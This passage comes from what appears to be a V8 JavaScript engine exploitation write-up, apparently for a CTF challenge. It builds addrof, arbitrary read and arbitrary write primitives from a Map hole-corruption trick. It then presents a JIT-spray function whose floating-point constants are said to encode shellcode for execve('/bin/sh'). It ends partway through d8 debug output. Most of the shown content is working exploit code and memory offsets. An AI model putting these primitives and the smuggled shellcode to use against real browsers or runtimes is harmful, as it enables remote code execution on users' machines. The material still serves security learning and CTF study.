<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> ArrayBuffer(<span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> f64_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(buf);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">var</span> u64_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Uint32Array(buf);
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> ftoi(val) {
</span></span><span style="display:flex;"><span>    f64_buf[<span style="color:#f60">0</span>] <span style="color:#555">=</span> val;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> BigInt(u64_buf[<span style="color:#f60">0</span>]) <span style="color:#555">+</span> (BigInt(u64_buf[<span style="color:#f60">1</span>]) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> itof(val) {
</span></span><span style="display:flex;"><span>    u64_buf[<span style="color:#f60">0</span>] <span style="color:#555">=</span> <span style="color:#366">Number</span>(val <span style="color:#555">&amp;</span> <span style="color:#f60">0xffffffff</span>n);
</span></span><span style="display:flex;"><span>    u64_buf[<span style="color:#f60">1</span>] <span style="color:#555">=</span> <span style="color:#366">Number</span>(val <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">32</span>n);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> f64_buf[<span style="color:#f60">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="creating-addrof">Creating addrof <a href="#creating-addrof" class="anchor">#</a></h4>
<p>Let&rsquo;s start by creating the easiest method, which is <code>addrof</code>. The trick is simple (inspired from this <a href="https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/" target="_blank" rel="noopener">article</a>):</p>
<ul>
<li>Create a new variable called <code>victim</code>, which is an array of empty objects.</li>
<li>Assign the targeted object to one of the elements of the <code>victim</code>&rsquo;s array.
<ul>
<li>After this, now the assigned <code>victim</code>&rsquo;s element will store a pointer to the address of the targeted object (lower 32-bit only).</li>
</ul>
</li>
<li>Using OOB read from the <code>oob_arr</code>, read the <code>victim</code>&rsquo;s elements&rsquo; stored value (which is the targeted object address).</li>
</ul>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>... <span style="color:#09f;font-style:italic">// Helpers is put at the top of these LOCs
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>oob_arr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>);
</span></span><span style="display:flex;"><span>victim <span style="color:#555">=</span> [{}, {}, {}, {}];
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> addrof(in_obj) {
</span></span><span style="display:flex;"><span>    mask <span style="color:#555">=</span> (<span style="color:#f60">1</span>n <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n) <span style="color:#555">-</span> <span style="color:#f60">1</span>n
</span></span><span style="display:flex;"><span>    victim[<span style="color:#f60">0</span>] <span style="color:#555">=</span> in_obj;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(oob_arr[<span style="color:#f60">12</span>]) <span style="color:#555">&amp;</span> mask;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li>Remember that <code>v8</code> only store the lower 32-bit of the object address, while <code>oob_arr</code> value is a 64-bit floating point, so the <code>addrof</code> method will need to be masked so that it will return only the lower 32-bits.</li>
<li>Sometimes, the correct offset for the <code>oob_arr</code> is changing during development. You need to examine it in the <code>gdb</code> properly so that <code>oob_arr[chosen_offset]</code> will return the targeted object address stored inside the <code>victim[0]</code></li>
</ul>
<h4 id="creating-read">Creating Read <a href="#creating-read" class="anchor">#</a></h4>
<p>After having <code>addrof</code> method, we need to be able to <code>read</code> the given address value. I decided to create a <code>read</code> method where:</p>
<ul>
<li>It can only read addresses relative to the stored <code>js_base</code>, so it can&rsquo;t read the value outside the js heap.</li>
<li>Send only the lower 32-bit of your targeted address (must be inside the js heap).</li>
<li>It will return a 64-bit floating point value of the resolved address&rsquo;s value.</li>
</ul>
<p>The trick that I used:</p>
<ul>
<li>Create an array called <code>read_gadget</code> which consists of floating-point values.</li>
<li>With OOB write from the <code>oob_arr</code>, overwrite the <code>read_gadget</code> elements pointer so that it points to <code>target_addr-0x8</code>. Why <code>-0x8</code>, because the first element of the array is stored in <code>elements+0x8</code>, so by setting the <code>elements</code> to point to <code>target_addr-0x8</code>, accessing <code>read_gadget[0]</code> will point to the <code>target_addr</code> value.</li>
<li>Return it</li>
</ul>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>... <span style="color:#09f;font-style:italic">// Helpers is put at the top of these LOCs
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>oob_arr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>);
</span></span><span style="display:flex;"><span>read_gadget <span style="color:#555">=</span> [<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>, <span style="color:#f60">3.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> addrof(in_obj) {
</span></span><span style="display:flex;"><span>    mask <span style="color:#555">=</span> (<span style="color:#f60">1</span>n <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n) <span style="color:#555">-</span> <span style="color:#f60">1</span>n
</span></span><span style="display:flex;"><span>    victim[<span style="color:#f60">0</span>] <span style="color:#555">=</span> in_obj;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(oob_arr[<span style="color:#f60">12</span>]) <span style="color:#555">&amp;</span> mask;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> weak_read(addr) {
</span></span><span style="display:flex;"><span>    oob_arr[<span style="color:#f60">37</span>] <span style="color:#555">=</span> itof(<span style="color:#f60">0x600000000</span>n<span style="color:#555">+</span>addr<span style="color:#555">-</span><span style="color:#f60">0x8</span>n);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(read_gadget[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes:</p>
<ul>
<li>The correct offset of <code>oob_arr</code> which points to the properties of <code>read_gadget</code> <code>elements</code> might be changed during the development of our exploit. Always double-check it in <code>gdb</code></li>
<li>Because <code>oob_arr</code> is overwriting the whole 64-bit of the given address, we need to overwrite the <code>read_gadget</code> length as well, which is why I add the targeted address with <code>0x600000000</code> as the 32 upper-bit value.</li>
</ul>
<h4 id="creating-write">Creating Write <a href="#creating-write" class="anchor">#</a></h4>
<p>Now that we have <code>read</code>, it&rsquo;s time to create the <code>write</code>. How to do it? Very simple. Same as <code>weak_read</code> method, but instead of returning the <code>read_gadget[0]</code> value, we assign the <code>read_gadget[0]</code> value with our desired value. Notes that the assignment&rsquo;s value will overwrite the whole 64-bit of the given address.</p>
<p>Modify the <code>poc.js</code> to:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>... <span style="color:#09f;font-style:italic">// Helpers is put at the top of these LOCs
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">var</span> c <span style="color:#555">=</span> [];
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Map();
</span></span><span style="display:flex;"><span>m.set(<span style="color:#f60">1</span>, <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.set(c.hole(), <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(c.hole());
</span></span><span style="display:flex;"><span>m.<span style="color:#069;font-weight:bold">delete</span>(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>oob_arr <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#366">Array</span>(<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>);
</span></span><span style="display:flex;"><span>read_gadget <span style="color:#555">=</span> [<span style="color:#f60">1.1</span>, <span style="color:#f60">2.2</span>, <span style="color:#f60">3.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> addrof(in_obj) {
</span></span><span style="display:flex;"><span>    mask <span style="color:#555">=</span> (<span style="color:#f60">1</span>n <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">32</span>n) <span style="color:#555">-</span> <span style="color:#f60">1</span>n
</span></span><span style="display:flex;"><span>    victim[<span style="color:#f60">0</span>] <span style="color:#555">=</span> in_obj;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(oob_arr[<span style="color:#f60">12</span>]) <span style="color:#555">&amp;</span> mask;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> weak_read(addr) {
</span></span><span style="display:flex;"><span>    oob_arr[<span style="color:#f60">37</span>] <span style="color:#555">=</span> itof(<span style="color:#f60">0x600000000</span>n<span style="color:#555">+</span>addr<span style="color:#555">-</span><span style="color:#f60">0x8</span>n);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> ftoi(read_gadget[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> weak_write(addr, value) {
</span></span><span style="display:flex;"><span>    oob_arr[<span style="color:#f60">37</span>] <span style="color:#555">=</span> itof(<span style="color:#f60">0x600000000</span>n<span style="color:#555">+</span>addr<span style="color:#555">-</span><span style="color:#f60">0x8</span>n);
</span></span><span style="display:flex;"><span>    read_gadget[<span style="color:#f60">0</span>] <span style="color:#555">=</span> itof(value);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="finding-a-way-to-control-the-rip">Finding a way to control the RIP <a href="#finding-a-way-to-control-the-rip" class="anchor">#</a></h3>
<p>Now that we have all the primitives that we need, we will move to our last step, which is controlling the RIP. After reading some articles, I find this <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener">article</a> very helpful for me.</p>
<p>Reading through the article, we actually can smuggle shellcode via JIT Spraying attack. To smuggle it, what we can do is translate our shellcode to a floating-point number, so that our floating-point number hex is stored as it is in the Jitted function area.</p>
<p>For example, consider this code (taken from the article that I mentioned above).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">const</span> foo <span style="color:#555">=</span> ()=&gt;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> [<span style="color:#f60">1.0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95538254221075331056310651818</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95606125582421466942709801013</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.99957147195425773436923756715</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">1.95337673326740932133292175341</span>E<span style="color:#555">-</span><span style="color:#f60">246</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f60">2.63486047652296056448306022844</span>E<span style="color:#555">-</span><span style="color:#f60">284</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">let</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> <span style="color:#f60">0x10000</span>; i<span style="color:#555">++</span>) {foo();foo();foo();foo();}
</span></span></code></pre></td></tr></table>
</div>
</div><p>The floating-point defined in the javascript is actually the smuggled shellcode which will do <code>sys_execve('/bin/sh')</code>. Because the function is called so many times, <code>v8</code> will JIT the code.</p>
<p>Let&rsquo;s try to examine what happen when the method <code>foo</code> got jitted by <code>v8</code> with the help of <code>%DebugPrint</code> and <code>job</code> after executing the above code.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>d8&gt; %DebugPrint(foo)
</span></span><span style="display:flex;"><span>DebugPrint: 0x1d9d002ca78d: [Function] in OldSpace
</span></span><span style="display:flex;"><span> - map: 0x1d9d00184241 &lt;Map[28](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span style="display:flex;"><span> - prototype: 0x1d9d001840f5 &lt;JSFunction (sfi = 0x1d9d00145dfd)&gt;
</span></span><span style="display:flex;"><span> - elements: 0x1d9d00002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span style="display:flex;"><span> - function prototype: &lt;no-prototype-slot&gt;
</span></span><span style="display:flex;"><span> - shared_info: 0x1d9d0019a025 &lt;SharedFunctionInfo foo&gt;
